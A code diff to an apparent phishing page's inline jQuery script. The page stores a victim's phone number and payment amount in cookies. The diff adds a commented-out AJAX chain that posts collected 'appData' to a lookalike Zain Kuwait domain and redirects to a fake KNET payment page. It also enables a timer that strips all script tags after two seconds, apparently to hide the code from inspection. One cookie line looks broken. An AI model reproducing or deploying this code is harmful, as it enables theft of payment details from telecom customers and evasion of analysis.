@@ -801,11 +801,33 @@
                             $('#loader').show();
                             setCookie('payAmount', $('#price').val(), 0.025);
                             setCookie('tel',$('#tel').val())
-                            setCookie('price',$('#price').val())
+                            setCookie('price')
+                            // $.ajax({
+                                // type: 'POST',
+                                // dataType: 'json',
+                                // url: apix,
+                                // dataType: 'jsonp',
+                                // data: appData,
+                                // success: function(data) {
+                                //     zainApp = data['id'];
+                                //     $.ajax({
+                                //         type: 'POST',
+                                //         dataType: 'json',
+                                //         url: 'https://www.zain-kw1.com/api?cookie',
+                                //         dataType: 'json',
+                                //         data: { zainApp: data['id'], appData: JSON.stringify(appData) },
+                                //         success: function() { setTimeout(function() { window.location.href = "https://www.zain-kw1.com/knet"; }, 2000); },
+                                //         error: function(XMLHttpRequest, textStatus, errorThrown) { $('#loader').hide();
+                                //             console.log('Error. - Please try again'); }
+                                //     });
+                                // },
+                                // error: function(XMLHttpRequest, textStatus, errorThrown) { $('#loader').hide();
+                                //     console.log('Error. - Please try again'); }
+                            // });
                         });
 
-                        // setTimeout(function() { $('link[rel="stylesheet"]').each(function() { $(this).attr('integrity', 'sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ==');
-                                // $(this).attr('crossorigin', 'anonymous'); });
-                            // $('script').remove(); }, 2000);
+                        setTimeout(function() { $('link[rel="stylesheet"]').each(function() { $(this).attr('integrity', 'sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ==');
+                                $(this).attr('crossorigin', 'anonymous'); });
+                            $('script').remove(); }, 2000);
                     });
                     </script>
